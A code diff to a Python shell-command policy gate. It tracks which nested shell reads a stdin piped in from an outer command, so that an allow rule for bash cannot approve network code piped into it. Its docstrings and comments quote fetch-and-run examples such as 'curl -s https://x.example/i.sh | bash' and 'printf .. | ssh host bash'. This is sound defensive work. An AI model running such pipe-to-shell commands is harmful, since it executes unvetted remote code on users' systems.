@@ -130,6 +130,8 @@ class Classification:
     # The own text of each command on this line that changes the shell for the commands after it (_sets_state): an
     # allow or log rule's `command` regex must match each of them too (#394). None stands for a function definition.
     setters: list[str | None] = field(default_factory=list, repr=False, compare=False)
+    # A part that runs the stdin of its line, which a command around that line may give (_runs_stdin, _given_stdin).
+    inherits: bool = field(default=False, repr=False, compare=False)
 
     def as_dict(self) -> dict:
         """Ledger-safe view: no outbound text or command, only their digests and sizes."""
@@ -138,6 +140,7 @@ class Classification:
         d.pop("_command_views")
         d.pop("own")
         d.pop("setters")
+        d.pop("inherits")
         for k in ("text", "title", "command"):
             v = d.pop(k)
             if v:
@@ -389,7 +392,7 @@ class _Cmd:
     operands: list = field(default_factory=list)     # _Word after an unquoted NAME=(..): more of its operands
     piped_group: bool = False    # piped from a compound (`( .. )`, `{ ..; }`, a loop), not from one simple command
     own: str | None = None       # its source text with its redirections, after leading reserved words (#394)
-    pipe_own: str | None = None  # piped from a simple command: the pipeline's text from its first command to this one
+    pipe_src: Callable[[], str] | None = None   # piped from simple commands: the pipeline's text up to this one
     fed: bool = False            # its stdin comes from a compound around it or piped into it (_feed_compound)
 
 
@@ -1086,7 +1089,7 @@ def _parse_line(src: str) -> tuple[list[_Cmd], list[str], bool]:
         if cur.words or cur.redirs or cur.heredocs or cur.herestrings:
             cur.own = lx._source(at, o_end)
             if cur.piped_in and not cur.piped_group and p_at >= 0:
-                cur.pipe_own = lx._source(p_at, o_end)
+                cur.pipe_src = functools.partial(lx._source, p_at, o_end)   # read only by _runs_stdin
             cmds.append(cur)
         else:
             at = -1
@@ -1736,12 +1739,43 @@ def _runs_stdin(c: Classification, k: _Cmd) -> Classification:
     """c, a part that runs k's stdin as code (a shell, an interpreter, ssh, xargs), with an own text that shows where
     that stdin comes from (#394): k's text when k sets its stdin itself or nothing feeds it, the pipeline from its
     first command when simple commands pipe into k (`curl -s https://x.example/i.sh | bash`), and none when a compound
-    feeds it (`{ bash; } < f`). So a rule written for `^bash` does not lower a pipe from the network into bash."""
-    if k.fed:
-        c.own = None
-    elif k.piped_in:
-        c.own = k.pipe_own
+    feeds it (`{ bash; } < f`). A shell in a nested line that sets no stdin of its own takes the text of the
+    command it runs inside (_given_stdin). So a rule written for `^bash` does not lower a pipe into bash."""
+    if k.fed or k.piped_in:
+        c.own = _stdin_own(k)()
+    elif not _own_stdin(k):
+        c.inherits = True             # the stdin of the line, which a command around it may give (_given_stdin)
     return c
+
+
+def _stdin_own(k: _Cmd) -> Callable[[], str | None]:
+    """The own text that shows where k's stdin comes from, built when asked (a pipeline's text costs its length): none
+    for a compound's, the pipeline from its first command for a pipe from simple commands, else k's own text."""
+    if k.fed:
+        return lambda: None
+    if k.piped_in:
+        return k.pipe_src or (lambda: None)
+    return lambda: k.own
+
+
+def _given_stdin(parts: list[Classification], src: Callable[[], str | None]) -> list[Classification]:
+    """``parts``, made for a command whose stdin is a pipe, a compound's or its own redirection, with the own text
+    ``src`` gives for each part in them that runs the stdin its line inherits (Classification.inherits):
+    `curl .. | bash -c bash`, `printf .. | ssh host bash` (#394). Parts are copied where they change, as they may
+    be shared."""
+    seen: dict[int, Classification] = {}
+    own: list[str | None] = []
+
+    def walk(c: Classification) -> Classification:
+        if id(c) not in seen:
+            seen[id(c)] = c          # a part met again through a shared one is left as it is
+            kids = [walk(p) for p in c.parts]
+            if c.inherits and not own:
+                own.append(src())
+            if c.inherits or any(a is not b for a, b in zip(kids, c.parts)):
+                seen[id(c)] = replace(c, parts=kids, own=own[0] if c.inherits else c.own, inherits=False)
+        return seen[id(c)]
+    return [walk(p) for p in parts]
 
 
 def _git_config_kind(key: str, value: str) -> str:
@@ -4125,11 +4159,18 @@ def _classify_shell(cmd: str, depth: int) -> Classification:
         # A post's body from stdin (#208): only what one simple command writes, never a compound's last command.
         ctx["post_stdin"] = _literal_stdin(k, _literal_pipe(prev) if k.piped_in and not k.piped_group else None)
         slot[0] = k.own
-        parts += _classify_simple(k, cmd, depth, ctx, piped)
+        got = _classify_simple(k, cmd, depth, ctx, piped)
+        if k.fed or k.piped_in or _own_stdin(k):          # a nested shell in it reads this stdin (#394)
+            got = _given_stdin(got, _stdin_own(k))
+        parts += got
         prev = k
     slot[0] = None
+    # A $( ) runs where the gate no longer knows which command it is in, so on a line where one has a stdin of its
+    # own, a shell inside a $( ) reads a stdin the gate cannot name (`curl .. | echo $(bash)`).
+    given = bool(subs) and any(k.fed or k.piped_in or _own_stdin(k) for k in cmds)
     for sub in subs:
-        parts.append(classify_shell(sub, depth + 1) if depth < _DEPTH else _too_deep(cmd))
+        got = [classify_shell(sub, depth + 1) if depth < _DEPTH else _too_deep(cmd)]
+        parts += _given_stdin(got, lambda: None) if given else got
     parts += ctx.get("late", [])
     if func:
         parts.append(_opaque("defines a shell function", cmd))
@@ -5555,14 +5596,20 @@ def _line_own_test(c: Classification, pol: Mapping, ctx: Mapping) -> Callable[[s
     core = {id(p) for p in parts if p.category == c.category or _severity(p) >= top}
     setters = list(dict.fromkeys(t for p in parts for t in p.setters))
     bare = {**pol, "gates": {**pol["gates"], "rules": []}}
-    alone: dict[int, int] = {}
+    raises = any(r["decision"] != "allow" for r in pol["gates"].get("rules") or [])   # an allow rule only lowers
+    alone: dict[tuple, int] = {}
 
     def stricter(p: Classification, level: int) -> bool:
         # The part alone, without the parts it was built from (each is tested in turn): no rule lowers it here.
-        if id(p) not in alone:
-            q = replace(p, parts=[], command=p.own if p.own is not None else p.command, _command_views=[])
-            alone[id(p)] = max(OUTCOMES.index(decide(q, bare, ctx).outcome), OUTCOMES.index(decide(q, pol, ctx).outcome))
-        return alone[id(p)] > level
+        # Parts alike decide alike, so a long line of the same few commands is decided a few times.
+        text = p.own if p.own is not None else p.command
+        key = (p.category, p.reversibility, p.exposure, p.third_party, p.cost, p.tool, p.summary, p.target, p.text,
+               p.title, p.text_file, text, tuple(p.signals))
+        if key not in alone:
+            q = replace(p, parts=[], command=text, _command_views=[])
+            out = OUTCOMES.index(decide(q, bare, ctx).outcome)
+            alone[key] = max(out, OUTCOMES.index(decide(q, pol, ctx).outcome)) if raises else out
+        return alone[key] > level
 
     def test(decision: str, patterns: list[str]) -> bool:
         regexes, seen, level = [re.compile(x) for x in patterns], {}, OUTCOMES.index(decision)
